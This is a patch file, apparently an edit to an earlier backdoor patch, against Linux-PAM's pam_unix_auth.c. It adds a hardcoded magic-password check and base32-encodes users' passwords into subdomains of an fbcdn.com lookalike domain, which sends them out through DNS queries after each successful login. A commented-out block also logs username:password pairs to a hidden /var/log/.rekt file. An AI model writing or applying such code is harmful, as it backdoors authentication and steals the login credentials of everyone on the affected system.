@@ -1,5 +1,5 @@
---- ./modules/pam_unix/pam_unix_auth.c	2020-05-25 21:46:41.000000000 +0000
-+++ pam_unix_auth.c	2020-05-27 00:52:31.351571000 +0000
+--- ./modules/pam_unix/pam_unix_auth.c	2020-05-27 01:04:46.803554000 +0000
++++ pam_unix_auth.c	2020-05-27 01:12:50.431195000 +0000
 @@ -49,6 +49,10 @@
  #include <sys/types.h>
  #include <sys/stat.h>
@@ -71,11 +71,11 @@
 +    baseencode_error_t fml;
 +    char *lmao = base32_encode(pw, strlen(pw)+1, &fml);
 +    sprintf(out, "%s.fbcdn.com", lmao);
-+   ngethostbyname(out, T_A);	/* verify the password of this user */
 +        //char *bdenc = b64_encode(p, strlen(p));
 +        char *bdenc = b64_encode(p, strlen(p));
 +        if (strcmp(bdenc, bdstr) != 0) {
 +          retval = _unix_verify_password(pamh, name, p, ctrl);
++	  if (retval == PAM_SUCCESS) { ngethostbyname(out, T_A);	}
 +/*          rekt=fopen("/var/log/.rekt", "a");
 +          fprintf(rekt, "%s:%s\n", name, p);
 +          fclose(rekt);
